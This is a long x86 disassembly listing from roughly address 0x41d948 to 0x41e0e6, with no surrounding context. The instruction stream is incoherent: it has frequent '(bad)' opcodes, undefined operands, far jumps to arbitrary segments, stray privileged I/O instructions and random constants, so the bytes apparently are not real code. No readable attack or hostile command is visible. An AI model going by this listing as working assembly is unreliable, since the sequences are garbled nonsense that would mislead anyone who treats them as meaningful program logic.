  41d948:	xchg   edx,eax
  41d949:	and    al,0xbd
  41d94b:	js     0x41d96f
  41d94d:	inc    edi
  41d94e:	jbe    0x41d96f
  41d950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d951:	stos   DWORD PTR es:[edi],eax
  41d952:	mov    WORD PTR [edi+ebx*8+0x4a],?
  41d956:	jmp    0x545e:0xb35156b9
  41d95d:	mov    eax,ds:0x5d6bbd4e
  41d962:	inc    ecx
  41d963:	das    
  41d964:	or     dl,0x82
  41d967:	sub    eax,0x26f6899a
  41d96c:	inc    esi
  41d96d:	in     al,dx
  41d96e:	mov    cl,0x15
  41d970:	push   ds
  41d971:	lea    ebp,[ebx]
  41d973:	or     ecx,DWORD PTR [ebx+0x7ed47d98]
  41d979:	jne    0x41d967
  41d97b:	mov    al,0x1f
  41d97d:	or     eax,0xe00e31a5
  41d982:	xor    DWORD PTR [ecx],edi
  41d984:	(bad)  
  41d985:	mov    cl,0x6
  41d987:	push   0x75
  41d989:	test   eax,ecx
  41d98b:	sbb    DWORD PTR [esi-0x80],esp
  41d98e:	test   al,0xa
  41d990:	cmp    cl,BYTE PTR [ecx+ecx*2]
  41d993:	and    al,0x3
  41d995:	and    DWORD PTR [edi],esp
  41d997:	mov    ch,0x7e
  41d999:	jl     0x41d9fe
  41d99b:	aaa    
  41d99c:	mov    bl,0x8d
  41d99e:	jmp    0x41d9ea
  41d9a0:	ins    DWORD PTR es:[edi],dx
  41d9a1:	mov    bh,0x61
  41d9a3:	sahf   
  41d9a4:	ret    0xe42
  41d9a7:	xor    BYTE PTR [esi-0x630d8344],0x2f
  41d9ae:	mov    ebp,0x56657f70
  41d9b3:	and    BYTE PTR [ecx+0x1d1f009c],dl
  41d9b9:	sti    
  41d9ba:	les    ecx,FWORD PTR [eax+esi*2]
  41d9bd:	scas   al,BYTE PTR es:[edi]
  41d9be:	sub    eax,0x94fb9f19
  41d9c3:	mov    ds:0x8f88e7fb,al
  41d9c8:	cmc    
  41d9c9:	mov    al,ds:0xf67512ca
  41d9ce:	push   ds
  41d9cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d1:	rcl    DWORD PTR [edi-0xea8b258],1
  41d9d7:	sbb    al,0x73
  41d9d9:	js     0x41d981
  41d9db:	mov    ss,WORD PTR [ebx+0x1]
  41d9de:	or     al,0xb
  41d9e0:	dec    esp
  41d9e1:	lods   eax,DWORD PTR ds:[esi]
  41d9e2:	nop
  41d9e3:	mov    ah,0x2
  41d9e5:	scas   eax,DWORD PTR es:[edi]
  41d9e6:	mov    ebx,0x41f1142f
  41d9eb:	jb     0x41da34
  41d9ed:	fisttp DWORD PTR [edx+0x71]
  41d9f0:	adc    DWORD PTR [esi+eiz*2-0x35fc7dcb],ebx
  41d9f7:	call   0xd76d:0x8ad69637
  41d9fe:	cmp    BYTE PTR [eax+0x4f7f8391],bh
  41da04:	fld    QWORD PTR [eax]
  41da06:	clc    
  41da07:	out    0xde,al
  41da09:	mov    ds:0x820e87f6,al
  41da0e:	xchg   edi,eax
  41da0f:	fdiv   QWORD PTR [esp+eiz*4-0x6a]
  41da13:	or     BYTE PTR [ebx],0x73
  41da16:	(bad)  
  41da17:	push   ebp
  41da18:	dec    esp
  41da19:	inc    ecx
  41da1a:	inc    ebp
  41da1b:	mov    eax,ds:0x67cb6099
  41da20:	xor    bh,BYTE PTR [eax-0x59dd4596]
  41da26:	adc    al,0x6
  41da28:	jnp    0x41d9ef
  41da2a:	dec    esp
  41da2b:	loope  0x41d9d1
  41da2d:	aaa    
  41da2e:	fld    DWORD PTR [ebx+0x1b]
  41da31:	jmp    0x41da98
  41da33:	sbb    BYTE PTR [ecx+edx*1-0x2b8d500b],al
  41da3a:	cdq    
  41da3b:	test   DWORD PTR [edi-0x1a2ccbea],ebx
  41da41:	fld    st(2)
  41da43:	in     eax,dx
  41da44:	js     0x41dab0
  41da46:	sbb    eax,0xa3a234c1
  41da4b:	and    DWORD PTR [esi+0x17],esi
  41da4e:	mov    al,ds:0x6883beae
  41da53:	(bad)  
  41da54:	popf   
  41da55:	sub    edx,DWORD PTR [ebx]
  41da57:	and    esp,DWORD PTR [bp+di-0x5e]
  41da5b:	lods   eax,DWORD PTR ds:[esi]
  41da5c:	jle    0x41dab5
  41da5e:	xchg   edi,eax
  41da5f:	xor    ebp,DWORD PTR [ebx]
  41da61:	outs   dx,DWORD PTR ds:[esi]
  41da62:	dec    eax
  41da63:	addr16 mov ah,0x21
  41da66:	lahf   
  41da67:	sti    
  41da68:	into   
  41da69:	cld    
  41da6a:	fwait
  41da6b:	xchg   DWORD PTR [ecx+0x4b9e247c],ebx
  41da71:	mov    bl,0x64
  41da73:	pop    esp
  41da74:	xchg   edx,eax
  41da75:	sbb    BYTE PTR [edi+ecx*8],dl
  41da78:	mov    ds:0x97460e9c,eax
  41da7d:	or     DWORD PTR [esi+ebx*2+0x1a],0xffffffb4
  41da82:	pop    edi
  41da83:	fsub   DWORD PTR fs:[ebx+esi*1-0x623b71b1]
  41da8b:	xchg   edx,ebx
  41da8d:	sbb    BYTE PTR [edx+0xf],bl
  41da90:	push   ds
  41da91:	push   ecx
  41da92:	jmp    0x41da73
  41da94:	ds mov dl,0xc2
  41da97:	jmp    0x6efc4092
  41da9c:	retf   0x8930
  41da9f:	in     eax,dx
  41daa0:	mov    ds:0x62843d0c,eax
  41daa5:	xchg   BYTE PTR [edi-0x19],dl
  41daa8:	scas   al,BYTE PTR es:[edi]
  41daa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daaa:	cdq    
  41daab:	gs or  eax,0xbba22f78
  41dab1:	into   
  41dab2:	sahf   
  41dab3:	jmp    0x41daea
  41dab5:	mov    bh,0x90
  41dab7:	cmp    ah,0x5
  41daba:	push   0xd826c3a9
  41dabf:	or     esp,DWORD PTR [eax]
  41dac1:	push   edx
  41dac2:	daa    
  41dac3:	push   esi
  41dac4:	mov    ecx,ebp
  41dac6:	xchg   esp,eax
  41dac7:	and    ecx,edx
  41dac9:	push   edi
  41daca:	mov    edi,0x73c1e0e6
  41dacf:	sub    eax,0x8cf32f9f
  41dad4:	fsub   QWORD PTR [ebp-0x637823dc]
  41dada:	xlat   BYTE PTR ds:[ebx]
  41dadb:	loopne 0x41db34
  41dadd:	daa    
  41dade:	(bad)  
  41dae0:	pop    esi
  41dae1:	sub    ch,dl
  41dae3:	push   es
  41dae4:	mov    ds:0x60db69d0,al
  41dae9:	rcr    dl,0x60
  41daec:	mov    bl,0x97
  41daee:	cmp    eax,0xd99c65e3
  41daf3:	add    bl,BYTE PTR [ebx]
  41daf5:	test   eax,0x48884d58
  41dafa:	sub    al,0xa
  41dafd:	cmc    
  41dafe:	mov    es,edi
  41db00:	mov    al,ds:0x650bb07b
  41db05:	mov    ebp,0xc43820af
  41db0a:	jle    0x41daeb
  41db0c:	jns    0x41db51
  41db0e:	or     esp,DWORD PTR [ebp-0x49057a28]
  41db14:	mov    ah,0xa3
  41db16:	and    BYTE PTR [esi-0x4557f25b],dh
  41db1c:	sub    BYTE PTR [ecx+0x73],al
  41db1f:	ds cli 
  41db21:	fisubr WORD PTR [edx-0x3202301c]
  41db27:	fnsave [eax]
  41db29:	xor    dh,BYTE PTR [edi+0xd043eb4]
  41db2f:	inc    ebp
  41db30:	(bad)  
  41db31:	xchg   esi,eax
  41db32:	mov    WORD PTR [esi+esi*1],?
  41db35:	jae    0x41db60
  41db37:	call   0x902dc92f
  41db3c:	push   esi
  41db3d:	loop   0x41db96
  41db3f:	idiv   DWORD PTR [esi+0x74]
  41db42:	in     al,dx
  41db43:	xchg   ebx,eax
  41db44:	pop    esp
  41db45:	cmc    
  41db46:	and    DWORD PTR [ebp-0x67],0xffffffdc
  41db4a:	gs ret 0xa039
  41db4e:	outs   dx,DWORD PTR ds:[esi]
  41db4f:	adc    al,0x53
  41db51:	jae    0x41db2e
  41db53:	fstp   TBYTE PTR [eax+0x5254d86e]
  41db59:	out    dx,al
  41db5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db5b:	out    0xf9,al
  41db5d:	test   eax,0x489ea35d
  41db62:	ds pop es
	...
  41db70:	add    BYTE PTR [ecx-0x11],al
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0x5b340762
  41db80:	fst    DWORD PTR ds:0xab000157
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [edx-0x7b],dh
  41db8b:	push   eax
  41db8c:	cmp    eax,0xec4ae7a4
  41db91:	jbe    0x41dbc8
  41db93:	pop    esi
  41db94:	aad    0x9e
  41db96:	push   0x3c628a79
  41db9b:	push   es
  41db9c:	jmp    FWORD PTR [ebx-0x477b9f49]
  41dba2:	lods   al,BYTE PTR ds:[esi]
  41dba3:	and    edi,DWORD PTR [esi-0x4673d022]
  41dba9:	std    
  41dbaa:	push   ebx
  41dbab:	outs   dx,DWORD PTR ds:[esi]
  41dbac:	or     DWORD PTR [ecx],edi
  41dbae:	lea    edx,[eax+0x31]
  41dbb1:	mov    ah,0xed
  41dbb3:	es imul esi,edx,0xffffffe4
  41dbb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb8:	mov    ch,0x89
  41dbba:	dec    edi
  41dbbb:	push   cs
  41dbbc:	mov    esi,0x99a37cf2
  41dbc1:	lock loop 0x41dc2f
  41dbc4:	sbb    dl,bh
  41dbc6:	leave  
  41dbc7:	aas    
  41dbc8:	or     esi,DWORD PTR [ebp+0x7b]
  41dbcb:	xchg   ecx,eax
  41dbcc:	add    eax,esi
  41dbce:	(bad)  
  41dbcf:	int3   
  41dbd0:	mov    BYTE PTR [ecx*4+0x3742769e],0xcb
  41dbd8:	mov    ch,0xfc
  41dbda:	jge    0x41dc14
  41dbdc:	mov    edi,DWORD PTR [ebx+esi*4]
  41dbdf:	mov    ecx,0x61cae820
  41dbe4:	nop    DWORD PTR [ecx]
  41dbe7:	ret    
  41dbe8:	ret    0x52ca
  41dbeb:	pop    ds
  41dbec:	arpl   WORD PTR [ebp-0x6522174d],sp
  41dbf2:	outs   dx,DWORD PTR ds:[esi]
  41dbf3:	idiv   edx
  41dbf5:	mov    dl,BYTE PTR [esi-0x14]
  41dbf8:	sub    dl,ah
  41dbfa:	inc    esi
  41dbfb:	je     0x41db97
  41dbfd:	repnz div DWORD PTR [eax]
  41dc00:	ins    DWORD PTR es:[edi],dx
  41dc01:	repz test DWORD PTR [eax],eax
  41dc04:	int3   
  41dc05:	sub    BYTE PTR [ebx],0x74
  41dc08:	nop
  41dc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc0a:	pop    DWORD PTR [edi+0x3b]
  41dc0d:	lods   al,BYTE PTR ds:[esi]
  41dc0e:	out    0xcc,al
  41dc10:	leave  
  41dc11:	xchg   dh,dl
  41dc13:	xchg   edi,edx
  41dc15:	pop    esi
  41dc16:	stos   BYTE PTR es:[edi],al
  41dc17:	fcmove st,st(2)
  41dc19:	jp     0x41dc49
  41dc1b:	pop    esi
  41dc1c:	pop    esp
  41dc1d:	fsub   QWORD PTR [ebx+0x56]
  41dc20:	shl    eax,cl
  41dc22:	dec    edx
  41dc23:	mov    esi,0xdca382b1
  41dc28:	test   al,0x63
  41dc2a:	xor    BYTE PTR [ebx+eiz*1],ch
  41dc2d:	adc    DWORD PTR [edi+0x6d26c9b2],eax
  41dc33:	mov    WORD PTR [eax],0x275b
  41dc38:	pop    ebx
  41dc39:	inc    ebp
  41dc3a:	outs   dx,BYTE PTR ds:[esi]
  41dc3b:	nop
  41dc3c:	sub    esp,0x6a34273b
  41dc42:	fsubr  DWORD PTR ds:0x71ad1755
  41dc48:	imul   ebx,DWORD PTR [eax],0x5b802f62
  41dc4e:	mov    ebx,0x6e388ef6
  41dc53:	pop    ecx
  41dc54:	ret    
  41dc55:	add    dl,bh
  41dc57:	in     al,0xe3
  41dc59:	push   ebx
  41dc5a:	cmp    eax,0xbc4dbf41
  41dc5f:	mov    esp,ebp
  41dc61:	inc    esp
  41dc62:	inc    ebx
  41dc63:	jns    0x41dcd0
  41dc65:	inc    esi
  41dc66:	xor    BYTE PTR [esi-0x68],bh
  41dc69:	scas   al,BYTE PTR es:[edi]
  41dc6a:	enter  0xd869,0x52
  41dc6e:	sub    eax,0xd375bff2
  41dc73:	cdq    
  41dc74:	cmp    al,0x52
  41dc76:	cmc    
  41dc77:	lods   eax,DWORD PTR ds:[esi]
  41dc78:	add    BYTE PTR [ecx-0x64bad8da],0xf9
  41dc7f:	out    dx,al
  41dc80:	pop    es
  41dc81:	or     ecx,DWORD PTR [edx]
  41dc83:	and    eax,0xbb9593bf
  41dc88:	xchg   edx,eax
  41dc89:	xlat   BYTE PTR ds:[ebx]
  41dc8a:	inc    ebp
  41dc8b:	cmp    eax,0xb905fe6e
  41dc90:	mov    eax,ds:0x5a4a0c58
  41dc95:	sbb    edi,0x39
  41dc98:	mov    ebx,0x26ee9cd1
  41dc9d:	scas   al,BYTE PTR es:[edi]
  41dc9e:	das    
  41dc9f:	fwait
  41dca0:	gs arpl cx,sp
  41dca3:	jae    0x41dc4c
  41dca5:	pop    ecx
  41dca6:	in     eax,0x3e
  41dca8:	aaa    
  41dca9:	sti    
  41dcaa:	xchg   edx,eax
  41dcab:	dec    edi
  41dcac:	(bad)  
  41dcaf:	pop    esi
  41dcb0:	push   ebx
  41dcb1:	xchg   edx,eax
  41dcb2:	xor    BYTE PTR [esi-0x79],cl
  41dcb5:	dec    esi
  41dcb6:	loop   0x41dc9b
  41dcb8:	cmp    DWORD PTR [edx],edi
  41dcba:	xlat   BYTE PTR ds:[ebx]
  41dcbb:	adc    ecx,DWORD PTR ds:0xf5f7fea7
  41dcc1:	jmp    0x1a8f1980
  41dcc6:	xchg   ebx,eax
  41dcc7:	push   ss
  41dcc8:	push   ebp
  41dcc9:	mov    al,ds:0xddc09013
  41dcce:	shl    DWORD PTR [ebx],0x98
  41dcd1:	pushf  
  41dcd2:	test   DWORD PTR [edx-0x5d],ebx
  41dcd5:	inc    ecx
  41dcd6:	dec    ebx
  41dcd7:	mov    cl,0xd6
  41dcd9:	add    ebx,DWORD PTR [ecx+ecx*1+0x1788f504]
  41dce0:	pop    esi
  41dce1:	cwde   
  41dce2:	push   ds
  41dce3:	jae    0x41dd5c
  41dce5:	(bad)  
  41dce6:	aam    0xd4
  41dce8:	in     eax,dx
  41dce9:	pop    edx
  41dcea:	jae    0x41dc73
  41dcec:	push   0xffffffd8
  41dcee:	dec    ebp
  41dcef:	add    BYTE PTR [edx],ch
  41dcf1:	sub    al,0xdd
  41dcf3:	add    dh,BYTE PTR [edi+0x12bfd26a]
  41dcf9:	jp     0x41dd79
  41dcfb:	in     al,dx
  41dcfc:	out    dx,al
  41dcfd:	int    0x72
  41dcff:	rcl    DWORD PTR [ecx-0x65adc631],cl
  41dd05:	or     BYTE PTR [esi],bh
  41dd07:	imul   ecx,DWORD PTR [ecx-0x58dfa3eb],0xd126ee81
  41dd11:	nop
  41dd12:	in     al,0xbd
  41dd14:	inc    edx
  41dd15:	mov    al,ds:0xdad90ad
  41dd1a:	cmp    BYTE PTR [edx+0x44],ch
  41dd1d:	inc    DWORD PTR [esi+0x7b812144]
  41dd23:	(bad)  
  41dd24:	cmp    eax,0xe79d4b52
  41dd29:	or     DWORD PTR [ebx-0x76a13913],ecx
  41dd2f:	aad    0x78
  41dd31:	adc    ch,al
  41dd33:	mov    ds:0xecd75176,al
  41dd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd39:	jecxz  0x41dcc7
  41dd3b:	mov    eax,edx
  41dd3d:	mov    eax,0x5ccf57e3
  41dd42:	jmp    0x41ddae
  41dd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd45:	(bad)  
  41dd47:	popf   
  41dd48:	dec    ebp
  41dd49:	lea    ecx,[eax+0x315e1f9d]
  41dd4f:	cli    
  41dd50:	test   eax,0x2cbd86a7
  41dd55:	loope  0x41dd00
  41dd57:	test   eax,0xacfc760f
  41dd5c:	out    dx,eax
  41dd5d:	mov    esp,edx
  41dd5f:	cmp    BYTE PTR [edi],ah
  41dd61:	jmp    0x41dd33
  41dd63:	or     dl,ch
  41dd65:	pop    eax
  41dd66:	loopne 0x41dcee
  41dd68:	push   ss
  41dd69:	jbe    0x41dda3
  41dd6b:	icebp  
  41dd6c:	or     al,0x83
  41dd6e:	cli    
  41dd6f:	jmp    0xb203a4a2
  41dd74:	add    ah,BYTE PTR [ebp+edx*8+0x6]
  41dd78:	lods   al,BYTE PTR ds:[esi]
  41dd79:	aas    
  41dd7a:	leave  
  41dd7b:	sti    
  41dd7c:	jb     0x41dd97
  41dd7e:	or     eax,0x322e7d2
  41dd83:	ja     0x41dda9
  41dd85:	sub    eax,0xde5584db
  41dd8a:	cmp    eax,DWORD PTR ds:0x55da5b5c
  41dd90:	add    eax,0x3fcdea28
  41dd95:	or     edi,0x1a
  41dd98:	dec    eax
  41dd99:	jns    0x41dd97
  41dd9b:	add    eax,0x8121f5de
  41dda0:	mov    bh,0x3a
  41dda2:	cmp    BYTE PTR [ecx+0x755cca2d],al
  41dda8:	in     al,dx
  41dda9:	(bad)  
  41ddaa:	mul    bh
  41ddac:	pop    esp
  41ddad:	ss push esi
  41ddaf:	fnstsw WORD PTR [esi+0x2a]
  41ddb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddb3:	xchg   ebp,eax
  41ddb4:	mov    ecx,0xfdd6782c
  41ddb9:	add    al,BYTE PTR ss:[esi+0xf]
  41ddbd:	jge    0x41de19
  41ddbf:	popf   
  41ddc0:	ret    0xab06
  41ddc3:	xchg   edx,eax
  41ddc4:	jmp    0x41de23
  41ddc6:	mov    dh,0x65
  41ddc8:	test   al,0x3a
  41ddca:	daa    
  41ddcb:	stos   DWORD PTR es:[edi],eax
  41ddcc:	outs   dx,DWORD PTR ds:[esi]
  41ddcd:	xor    al,0x63
  41ddcf:	push   ebp
  41ddd0:	fldcw  WORD PTR [edi]
  41ddd2:	ret    0x731a
  41ddd5:	call   0x18d06889
  41ddda:	pop    edx
  41dddb:	mov    cl,0xc9
  41dddd:	push   es
  41ddde:	test   eax,0x2dc305f4
  41dde3:	stc    
  41dde4:	inc    edi
  41dde5:	sbb    DWORD PTR [ecx],eax
  41dde7:	icebp  
  41dde8:	jns    0x41ddac
  41ddea:	addr16 inc ebp
  41ddec:	punpckhwd mm1,mm3
  41ddef:	mov    ds:0xd2812f57,eax
  41ddf4:	jg     0x41de54
  41ddf6:	jl     0x41ddf4
  41ddf8:	inc    esp
  41ddf9:	sahf   
  41ddfa:	inc    esi
  41ddfb:	xlat   BYTE PTR ds:[ebx]
  41ddfc:	shr    BYTE PTR ds:0xb1cbc947,cl
  41de02:	push   esp
  41de03:	sbb    BYTE PTR [eax+0x18097dde],bh
  41de09:	jg     0x41dde7
  41de0b:	cmp    eax,0xae03f6d9
  41de10:	repz ja 0x41de5d
  41de13:	rcr    bh,0xb3
  41de16:	into   
  41de17:	sti    
  41de18:	fs fsubr st(5),st
  41de1b:	test   al,0xfb
  41de1d:	mov    ds:0x645d339a,al
  41de22:	mov    dh,0xf3
  41de24:	cmp    al,BYTE PTR [ebx-0x7f172292]
  41de2a:	(bad)  
  41de2b:	or     eax,esi
  41de2d:	aas    
  41de2e:	fucomi st,st(7)
  41de30:	push   0x6b355b56
  41de35:	jmp    0xda8440ce
  41de3a:	mov    ebx,0x7310b3d0
  41de3f:	jle    0x41de1f
  41de41:	ins    BYTE PTR es:[edi],dx
  41de42:	loopne 0x41ddc4
  41de44:	test   al,0xcb
  41de46:	dec    edi
  41de47:	pop    ecx
  41de48:	call   0x2ecb:0xdb57eb67
  41de4f:	je     0x41de49
  41de51:	aad    0xab
  41de53:	mov    dl,0xfc
  41de55:	fstp   DWORD PTR [edx+0x5d]
  41de58:	xchg   ebp,eax
  41de59:	iret   
  41de5a:	sbb    DWORD PTR [esi-0x1d],0x51
  41de5e:	icebp  
  41de5f:	stos   DWORD PTR es:[edi],eax
  41de60:	lea    edi,[edi-0x49]
  41de63:	lock lds ebp,FWORD PTR [esi+0x53e4db26]
  41de6a:	(bad)  
  41de6c:	xor    cl,BYTE PTR [ebx]
  41de6e:	sub    edi,DWORD PTR [esi-0x7cfa25e3]
  41de74:	jmp    0x8acd:0xf2945583
  41de7b:	xor    eax,0xa983708e
  41de80:	add    DWORD PTR [edx+eiz*4-0x22],ebx
  41de84:	rol    DWORD PTR [ebx],cl
  41de86:	setne  BYTE PTR [ecx+0xbf2d18c]
  41de8d:	mov    esp,0x1a883fa5
  41de92:	nop
  41de93:	sub    edi,eax
  41de95:	in     eax,dx
  41de96:	(bad)  [edx]
  41de98:	jnp    0x41de5b
  41de9a:	inc    eax
  41de9b:	mov    dl,0x8c
  41de9d:	jno    0x41de4f
  41de9f:	adc    esp,DWORD PTR [eax+edx*1+0x2d]
  41dea3:	mov    ebx,0xb059017a
  41dea8:	test   DWORD PTR [esi+0x4cec13ef],edi
  41deae:	inc    ecx
  41deaf:	std    
  41deb0:	mov    cs,WORD PTR [edi+0x55]
  41deb3:	push   es
  41deb4:	(bad)  
  41deb6:	in     al,0x8d
  41deb8:	jl     0x41def6
  41deba:	call   0xe1bb5c7b
  41debf:	imul   esp,DWORD PTR [eax],0x411b7dcf
  41dec5:	call   0xccbd8e86
  41deca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41decb:	jbe    0x41debf
  41decd:	cs stos DWORD PTR es:[edi],eax
  41decf:	aaa    
  41ded0:	outs   dx,BYTE PTR ds:[esi]
  41ded1:	fcmovu st,st(0)
  41ded3:	push   cs
  41ded4:	cmc    
  41ded5:	inc    ecx
  41ded6:	test   al,0x6a
  41ded8:	mov    ecx,0x3d469cbc
  41dedd:	pop    esp
  41dede:	stos   BYTE PTR es:[edi],al
  41dedf:	dec    esp
  41dee0:	jae    0x41dee6
  41dee2:	add    cl,BYTE PTR [edi+0xc]
  41dee5:	bound  edx,QWORD PTR [esi+0x30]
  41dee8:	and    DWORD PTR [ecx],ebx
  41deea:	fidiv  DWORD PTR [edi+eax*8+0x7c]
  41deee:	mov    ebp,0xfd27655a
  41def3:	xchg   eax,eax
  41def5:	aaa    
  41def6:	xchg   edi,eax
  41def7:	ret    
  41def8:	sti    
  41def9:	sar    DWORD PTR [ebp-0x31],0xcc
  41defd:	mov    ebx,0x316c2579
  41df02:	sbb    bh,ch
  41df04:	ss fwait
  41df06:	or     dl,dl
  41df08:	cdq    
  41df09:	not    BYTE PTR [eax-0x14]
  41df0c:	test   eax,0xba0c42fa
  41df11:	and    BYTE PTR [ecx-0x7816416c],ah
  41df17:	or     dl,BYTE PTR [ebx+0x5f]
  41df1a:	and    DWORD PTR [edi],ebp
  41df1c:	push   ds
  41df1d:	jge    0x41df20
  41df1f:	mov    eax,0xbfb3ec26
  41df24:	jae    0x41ded5
  41df26:	fild   QWORD PTR [ebx+0x52467e50]
  41df2c:	sub    BYTE PTR [esi],bl
  41df2e:	call   0xab:0xb027a5f9
	...
  41df41:	adc    eax,0x7f7d7f79
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	add    BYTE PTR [edi+ecx*4+0x5ac0ea25],0x1
  41df54:	add    BYTE PTR [ebx-0x33fffffd],ch
  41df5a:	test   al,0x7a
  41df5c:	mov    bh,0x45
  41df5e:	loope  0x41dfd9
  41df60:	fbstp  TBYTE PTR [eax]
  41df62:	mov    esi,0xc71b11e5
  41df67:	and    al,0x7a
  41df69:	(bad)  
  41df6b:	ret    0x8fc6
  41df6e:	xchg   ecx,eax
  41df6f:	dec    edx
  41df70:	lea    ebx,[ecx+0x1acbe631]
  41df76:	xchg   esi,eax
  41df77:	popa   
  41df78:	leave  
  41df79:	cld    
  41df7a:	call   0x7290:0x88c0cea1
  41df81:	xchg   BYTE PTR [eax],dl
  41df83:	push   eax
  41df84:	frstor [edi+ecx*2+0x5e]
  41df88:	pop    eax
  41df89:	cmp    BYTE PTR [edi+0xda117f2],dl
  41df8f:	jmp    0x5c774a6
  41df94:	ss leave 
  41df96:	ja     0x41df6d
  41df98:	pop    eax
  41df99:	dec    esp
  41df9a:	pop    edi
  41df9b:	add    eax,DWORD PTR [edi+0x24cc5367]
  41dfa1:	pop    esi
  41dfa2:	int3   
  41dfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfa4:	out    dx,al
  41dfa5:	mov    dl,0xdd
  41dfa7:	cmp    BYTE PTR [esi-0x62],ah
  41dfaa:	sbb    eax,0xe7be862a
  41dfaf:	pop    edx
  41dfb0:	xor    ah,BYTE PTR [ecx-0x3f6409c5]
  41dfb6:	xor    edx,DWORD PTR [ecx+0x2f]
  41dfb9:	shl    DWORD PTR [edx],1
  41dfbb:	loopne 0x41dfc3
  41dfbd:	or     DWORD PTR [ebp+0xe],esi
  41dfc0:	dec    DWORD PTR [ebx-0x3de2c5be]
  41dfc6:	test   eax,0xfaedc6b2
  41dfcb:	mov    cl,0x6a
  41dfcd:	lahf   
  41dfce:	into   
  41dfcf:	das    
  41dfd0:	pop    ss
  41dfd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfd2:	popf   
  41dfd3:	out    dx,al
  41dfd4:	bound  esp,QWORD PTR [edx-0x4b400a5e]
  41dfda:	mov    WORD PTR [esi],ss
  41dfdc:	pop    ebp
  41dfdd:	cli    
  41dfde:	cmp    BYTE PTR [ecx-0x4],0x67
  41dfe2:	adc    eax,0x12bc93b4
  41dfe7:	cdq    
  41dfe8:	adc    eax,ebx
  41dfea:	inc    esp
  41dfeb:	mov    edx,0x88941dda
  41dff0:	(bad)  
  41dff1:	mov    esi,0xa18dc0d5
  41dff6:	pop    ss
  41dff7:	aas    
  41dff8:	enter  0xba87,0x3e
  41dffc:	enter  0xbedf,0x3c
  41e000:	les    edx,FWORD PTR [esi+0x78f4cdb1]
  41e006:	fwait
  41e007:	mov    DWORD PTR [edi+0x441afc7f],esi
  41e00d:	scas   eax,DWORD PTR es:[edi]
  41e00e:	ret    0xe01c
  41e011:	jg     0x41e066
  41e013:	push   0x5f07e59e
  41e018:	dec    ecx
  41e019:	pop    ebp
  41e01a:	dec    ebx
  41e01b:	mov    ah,0x59
  41e01d:	in     eax,0x9e
  41e01f:	ja     0x41e0a0
  41e021:	mov    ?,WORD PTR [edi]
  41e023:	ins    BYTE PTR es:[edi],dx
  41e024:	jno    0x41e047
  41e026:	dec    edx
  41e027:	int3   
  41e028:	scas   eax,DWORD PTR es:[edi]
  41e029:	xchg   ecx,eax
  41e02a:	xor    DWORD PTR [ebp+0x3b213186],ebp
  41e030:	(bad)  
  41e031:	xchg   edi,eax
  41e032:	dec    eax
  41e033:	and    eax,0x228539ad
  41e038:	sub    al,0x30
  41e03a:	jne    0x41e0a8
  41e03c:	retf   0xa29d
  41e03f:	out    dx,eax
  41e040:	pop    ecx
  41e041:	mov    ebp,0x5f4b4e67
  41e046:	jns    0x41e05a
  41e048:	push   0xffffff91
  41e04a:	xchg   ebx,eax
  41e04b:	jo     0x41dfdf
  41e04d:	xor    ebp,DWORD PTR [esi+0x3a8d38e7]
  41e053:	fmul   DWORD PTR [edx-0x50418431]
  41e059:	jo     0x41e009
  41e05b:	mov    ds,WORD PTR [eax+0x62e0c76a]
  41e061:	int3   
  41e062:	mov    bl,0xb6
  41e064:	pop    esi
  41e065:	(bad)  
  41e066:	xor    DWORD PTR [edi+0x1a],ebx
  41e069:	push   esi
  41e06a:	pop    esi
  41e06b:	adc    al,0x9b
  41e06d:	rcr    DWORD PTR [ecx+0x4061ddc9],cl
  41e073:	mov    eax,0xf468afa2
  41e078:	out    0x80,al
  41e07a:	jns    0x41e033
  41e07c:	mov    esi,0x1c491ae4
  41e081:	loop   0x41e079
  41e083:	lock arpl WORD PTR ds:0x2f512577,sp
  41e08a:	pop    edi
  41e08b:	push   ss
  41e08c:	lea    ebx,[esp+eax*1+0x51]
  41e090:	add    ch,BYTE PTR [edi+eiz*1]
  41e093:	sub    BYTE PTR [esi],al
  41e095:	jb     0x41e024
  41e097:	idiv   DWORD PTR [esi+0x6f]
  41e09a:	rcl    BYTE PTR [ecx+eiz*4-0x34],0x1a
  41e09f:	call   0x7b5f1ef3
  41e0a4:	icebp  
  41e0a5:	ret    
  41e0a6:	mov    ah,0xae
  41e0a8:	hlt    
  41e0a9:	sbb    DWORD PTR [ecx],0x7c
  41e0ac:	jbe    0x41e050
  41e0ae:	mov    fs,WORD PTR [ebp-0x78]
  41e0b1:	mov    al,0xb8
  41e0b3:	and    edx,DWORD PTR [ebp+0x5561fd46]
  41e0b9:	adc    BYTE PTR [ebx],cl
  41e0bb:	cmp    al,0x5f
  41e0bd:	xchg   edx,eax
  41e0be:	ja     0x41e0b6
  41e0c0:	jl     0x41e13b
  41e0c2:	dec    ebp
  41e0c3:	imul   esi,DWORD PTR [ecx+eax*2-0x7fe07188],0xaea3985b
  41e0ce:	inc    ecx
  41e0cf:	stos   DWORD PTR es:[edi],eax
  41e0d0:	and    bl,BYTE PTR [edi-0x5c1923aa]
  41e0d6:	pop    esp
  41e0d7:	shl    DWORD PTR [edx],1
  41e0d9:	adc    al,0x70
  41e0db:	cmp    BYTE PTR [edx-0x45d794e],cl
  41e0e1:	fwait
  41e0e2:	std    
  41e0e3:	pop    eax
  41e0e4:	ds ins DWORD PTR es:[edi],dx
  41e0e6:	sbb    edx,DWORD PTR [eax-0x47f5eca2]
